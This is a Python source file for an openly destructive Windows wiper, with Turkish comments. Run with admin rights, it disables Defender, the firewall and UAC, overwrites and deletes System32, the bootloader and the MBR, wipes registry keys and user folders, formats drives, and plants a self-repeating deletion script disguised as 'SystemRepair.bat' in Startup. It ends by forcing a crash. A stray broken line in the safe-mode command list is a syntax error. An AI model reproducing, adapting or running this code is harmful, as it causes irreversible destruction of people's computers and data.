# main.py - GitHub Repo için Tam Destruction Script
import os
import shutil
import ctypes
import subprocess
import sys
import stat
import time
import psutil
import winreg
import msvcrt
import random
import string
import hashlib

class SystemDestroyer:
    def __init__(self):
        self.system32_path = os.path.join(os.environ['SYSTEMROOT'], 'System32')
        self.windows_path = os.environ['SYSTEMROOT']
        self.bootloader_path = os.path.join(self.windows_path, "Boot")
        self.efi_path = os.path.join(self.windows_path, "EFI")
        self.mbr_path = "\\\\.\\PhysicalDrive0"
        self.destruction_log = []
        
    def check_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
            
    def elevate_to_admin(self):
        if not self.check_admin():
            print("[!] Admin privileges required. Attempting elevation...")
            params = ' '.join(sys.argv)
            try:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, params, None, 1
                )
                sys.exit(0)
            except:
                print("[!] Elevation failed. Run as Administrator manually.")
                sys.exit(1)
                
    def disable_protections(self):
        """Windows Defender, UAC, Firewall tamamen kapat"""
        print("[+] Disabling Windows protections...")
        
        kill_commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -Force"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true -Force"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true -Force"',
            'powershell -Command "Set-MpPreference -DisableScriptScanning $true -Force"',
            'powershell -Command "Add-MpPreference -ExclusionPath C:\\ -Force"',
            'netsh advfirewall set allprofiles state off',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f',
            'sc config WinDefend start= disabled',
            'sc stop WinDefend',
            'sc config wscsvc start= disabled',
            'sc stop wscsvc',
            'sc config Sense start= disabled',
            'sc stop Sense',
        ]
        
        for cmd in kill_commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=3)
                self.destruction_log.append(f"Disabled: {cmd}")
            except:
                pass
                
    def corrupt_system_files(self):
        """System32 içindeki kritik dosyaları boz"""
        print("[+] Corrupting critical system files...")
        
        critical_files = [
            "ntoskrnl.exe",
            "hal.dll",
            "winload.exe",
            "winload.efi",
            "bootmgr",
            "smss.exe",
            "csrss.exe",
            "winlogon.exe",
            "services.exe",
            "lsass.exe",
            "kernel32.dll",
            "user32.dll",
            "gdi32.dll",
            "advapi32.dll",
            "shell32.dll",
            "explorer.exe",
            "cmd.exe",
            "powershell.exe",
            "regedit.exe",
            "taskmgr.exe",
            "control.exe",
        ]
        
        for file in critical_files:
            file_path = os.path.join(self.system32_path, file)
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'wb') as f:
                        f.write(os.urandom(os.path.getsize(file_path)))
                    self.destruction_log.append(f"Corrupted: {file}")
                except:
                    pass
                    
    def delete_system32(self):
        """System32'yi tamamen sil"""
        print("[+] Deleting System32 directory...")
        
        try:
            # Önce ownership al
            subprocess.run(f'takeown /f "{self.system32_path}" /r /d y', shell=True)
            subprocess.run(f'icacls "{self.system32_path}" /grant administrators:F /t', shell=True)
            
            # Sil
            shutil.rmtree(self.system32_path, ignore_errors=True)
            self.destruction_log.append("Deleted: System32")
        except Exception as e:
            print(f"[!] System32 deletion error: {e}")
            
    def delete_bootloader(self):
        """Bootloader'ı sil - bilgisayar açılamaz"""
        print("[+] Deleting bootloader...")
        
        boot_paths = [
            self.bootloader_path,
            self.efi_path,
            os.path.join(self.windows_path, "Boot"),
            os.path.join(self.windows_path, "EFI"),
            os.path.join(self.windows_path, "bootmgr"),
            os.path.join(self.windows_path, "BOOTNXT"),
        ]
        
        for path in boot_paths:
            if os.path.exists(path):
                try:
                    if os.path.isfile(path):
                        os.remove(path)
                    else:
                        shutil.rmtree(path, ignore_errors=True)
                    self.destruction_log.append(f"Deleted: {path}")
                except:
                    pass
                    
    def corrupt_mbr(self):
        """MBR'yi boz - kalıcı açılış hatası"""
        print("[+] Corrupting Master Boot Record...")
        
        try:
            with open(self.mbr_path, 'rb+') as disk:
                # MBR'nin ilk 512 byte'ını boz
                disk.write(os.urandom(512))
            self.destruction_log.append("Corrupted: MBR")
        except:
            pass
            
    def destroy_registry(self):
        """Windows Registry'yi tamamen boz"""
        print("[+] Destroying Windows Registry...")
        
        registry_hives = [
            ("HKLM\\SOFTWARE", winreg.HKEY_LOCAL_MACHINE),
            ("HKLM\\SYSTEM", winreg.HKEY_LOCAL_MACHINE),
            ("HKLM\\SAM", winreg.HKEY_LOCAL_MACHINE),
            ("HKLM\\SECURITY", winreg.HKEY_LOCAL_MACHINE),
            ("HKCR", winreg.HKEY_CLASSES_ROOT),
            ("HKCU", winreg.HKEY_CURRENT_USER),
        ]
        
        for hive_name, hive in registry_hives:
            try:
                # Anahtarları silmeye çalış
                key = winreg.OpenKey(hive, "", 0, winreg.KEY_ALL_ACCESS)
                for i in range(1000):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey_path = f"{hive_name}\\{subkey_name}"
                        try:
                            winreg.DeleteKey(hive, subkey_name)
                            self.destruction_log.append(f"Deleted registry: {subkey_path}")
                        except:
                            pass
                    except:
                        break
                winreg.CloseKey(key)
            except:
                pass
                
    def fill_disk_with_junk(self):
        """Disk'i rastgele data ile doldur"""
        print("[+] Filling disk with junk data...")
        
        try:
            drives = psutil.disk_partitions()
            for drive in drives:
                if drive.device.startswith('C:'):
                    drive_path = drive.mountpoint
                    junk_file = os.path.join(drive_path, "JUNK_DATA.bin")
                    
                    # 1GB junk data yaz
                    with open(junk_file, 'wb') as f:
                        for _ in range(1024):  # 1024 * 1MB = 1GB
                            f.write(os.urandom(1024 * 1024))
                    
                    self.destruction_log.append(f"Junk data: {junk_file}")
                    break
        except:
            pass
            
    def disable_safe_mode(self):
        """Safe Mode'u devre dışı bırak"""
        print("[+] Disabling Safe Mode...")
        
        commands = [
            'bcdedit /deletevalue {default} safeboot',
1',
            'bcdedit /deletevalue {current} safeboot',
            'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
            'bcdedit /set {current} bootstatuspolicy ignoreallfailures',
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot" /v "AlternateShell" /t REG_SZ /d "cmd.exe" /f',
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=3)
                self.destruction_log.append(f"Disabled SafeMode: {cmd}")
            except:
                pass
                
    def kill_windows_processes(self):
        """Tüm kritik Windows process'lerini öldür"""
        print("[+] Killing Windows processes...")
        
        processes_to_kill = [
            "explorer.exe",
            "svchost.exe",
            "wininit.exe",
            "services.exe",
            "lsass.exe",
            "winlogon.exe",
            "csrss.exe",
            "smss.exe",
            "taskhostw.exe",
            "dwm.exe",
            "RuntimeBroker.exe",
            "SearchIndexer.exe",
            "spoolsv.exe",
        ]
        
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in processes_to_kill]:
                    p = psutil.Process(proc.info['pid'])
                    p.terminate()
                    p.kill()
                    self.destruction_log.append(f"Killed: {proc.info['name']}")
            except:
                pass
                
    def schedule_destruction_on_boot(self):
        """Açılışta tam yıkım için planla"""
        print("[+] Scheduling destruction on next boot...")
        
        try:
            # Startup'a batch dosyası ekle
            startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            if not os.path.exists(startup_path):
                os.makedirs(startup_path)
                
            batch_content = '''@echo off
:loop
del /f /q C:\\Windows\\System32\\*.*
rmdir /s /q C:\\Windows\\System32
del /f /q C:\\Windows\\*.*
rmdir /s /q C:\\Windows
del /f /q C:\\*.*
format C: /fs:NTFS /q /y
goto loop
'''
            
            batch_path = os.path.join(startup_path, "SystemRepair.bat")
            with open(batch_path, 'w') as f:
                f.write(batch_content)
                
            # Registry'de run key ekle
            reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemRepair", 0, winreg.REG_SZ, batch_path)
            winreg.CloseKey(key)
            
            self.destruction_log.append("Scheduled: Destruction on boot")
        except:
            pass
            
    def create_fake_bsod(self):
        """Sahte BSOD oluştur"""
        print("[+] Creating fake BSOD...")
        
        try:
            # BSOD simülasyonu
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.pointer(ctypes.c_int(1)))
            
            # NtRaiseHardError çağır
            error_params = [
                0xDEADDEAD,  # Error code
                0,           # Flags
                0,           # Parameters count
                0,           # Parameters
                6,           # Response option (shutdown)
                ctypes.pointer(ctypes.c_int(0))
            ]
            
            ctypes.windll.ntdll.NtRaiseHardError(*error_params)
            
            self.destruction_log.append("Fake BSOD triggered")
        except:
            # Alternatif BSOD method
            bsod_code = '''
#include <windows.h>
int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
    
    int Enabled = 1;
    ((void(*)())RtlAdjustPrivilege)(19, 1, 0, &Enabled);
    
    ULONG Response;
    ((void(*)())NtRaiseHardError)(0xC000021A, 0, 0, 0, 6, &Response);
    return 0;
}
'''
            
            try:
                # C kodunu compile edip çalıştır
                with open("bsod.c", "w") as f:
                    f.write(bsod_code)
                subprocess.run("gcc bsod.c -o bsod.exe", shell=True)
                subprocess.run("bsod.exe", shell=True)
                self.destruction_log.append("BSOD via compiled C code")
            except:
                pass
    
    def destroy_user_data(self):
        """User data'ları sil"""
        print("[+] Destroying user data...")
        
        user_data_paths = [
            os.environ['USERPROFILE'],
            os.path.join(os.environ['USERPROFILE'], "Desktop"),
            os.path.join(os.environ['USERPROFILE'], "Documents"),
            os.path.join(os.environ['USERPROFILE'], "Downloads"),
            os.path.join(os.environ['USERPROFILE'], "Pictures"),
            os.path.join(os.environ['USERPROFILE'], "Music"),
            os.path.join(os.environ['USERPROFILE'], "Videos"),
        ]
        
        for path in user_data_paths:
            if os.path.exists(path):
                try:
                    shutil.rmtree(path, ignore_errors=True)
                    self.destruction_log.append(f"Deleted user data: {path}")
                except:
                    pass
    
    def format_disk(self):
        """Disk'i formatla"""
        print("[+] Formatting disk...")
        
        format_commands = [
            'format C: /fs:NTFS /q /y',
            'format D: /fs:NTFS /q /y',
            'format E: /fs:NTFS /q /y',
        ]
        
        for cmd in format_commands:
            try:
                subprocess.run(cmd, shell=True, timeout=10)
                self.destruction_log.append(f"Format command: {cmd}")
            except:
                pass
    
    def disable_recovery(self):
        """Windows Recovery özelliklerini devre dışı bırak"""
        print("[+] Disabling recovery features...")
        
        recovery_commands = [
            'reagentc /disable',
            'bcdedit /deletevalue {default} recoverysequence',
            'bcdedit /deletevalue {default} recoveryenabled',
            'reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment" /v "SystemRoot" /f',
        ]
        
        for cmd in recovery_commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=3)
                self.destruction_log.append(f"Disabled recovery: {cmd}")
            except:
                pass
    
    def execute_all_destruction(self):
        """Tüm yıkım metodlarını çalıştır"""
        print("\n" + "="*60)
        print("     SYSTEM PERMANENT DESTRUCTION STARTING")
        print("="*60)
        
        methods = [
            self.disable_protections,
            self.kill_windows_processes,
            self.corrupt_system_files,
            self.delete_system32,
            self.delete_bootloader,
            self.corrupt_mbr,
            self.destroy_registry,
            self.fill_disk_with_junk,
            self.disable_safe_mode,
            self.disable_recovery,
            self.destroy_user_data,
            self.schedule_destruction_on_boot,
            self.create_fake_bsod,
        ]
        
        for method in methods:
            method()
            
        # Final shutdown
        print("\n[+] SYSTEM DESTRUCTION COMPLETED")
        print("[+] Computer will now shutdown permanently")
        
        # Log kaydet
        log_path = os.path.join(os.environ['USERPROFILE'], "destruction_log.txt")
        with open(log_path, 'w') as f:
            f.write("System Destruction Log:\n")
            for entry in self.destruction_log:
                f.write(f"{entry}\n")
        
        # Force shutdown
        subprocess.run("shutdown /s /f /t 0", shell=True)
        
        # Son bir işlem - kalıcı açılış engelleme
        try:
            # BIOS ayarları bozma (simulated)
            bios_destroy = '''
echo "BIOS destruction simulated"
echo "Setting boot order to empty"
echo "Disabling all boot devices"
'''
            
            with open("bios_destroy.bat", 'w') as f:
                f.write(bios_destroy)
            
            subprocess.run("bios_destroy.bat", shell=True)
        except:
            pass
    
    def run(self):
        """Ana çalıştırma fonksiyonu"""
        self.elevate_to_admin()
        self.execute_all_destruction()

if __name__ == "__main__":
    destroyer = SystemDestroyer()
    destroyer.run()
